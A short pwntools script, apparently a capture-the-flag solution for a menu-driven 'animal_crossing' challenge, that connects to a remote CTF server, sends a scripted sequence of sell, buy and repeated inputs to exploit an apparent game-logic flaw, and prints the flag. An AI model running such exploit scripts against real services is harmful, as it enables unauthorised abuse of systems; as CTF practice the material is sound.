from pwn import *

# p = process('./animal_crossing')
p = remote('ctf.umbccd.io', 4400)

to_sell = [1,2,2,3,4]
buy = b'2\n2\n'
sell = '1\n{}\n'
win = b'1\n1\n'
flag = b'2\n6\n1\n'

buf = b''
for i in to_sell:
    buf += sell.format(i).encode()
buf += buy
buf += win*52
buf += flag

p.send(buf)
p.recvuntil('2. flag - ')
print(p.recvline().decode())
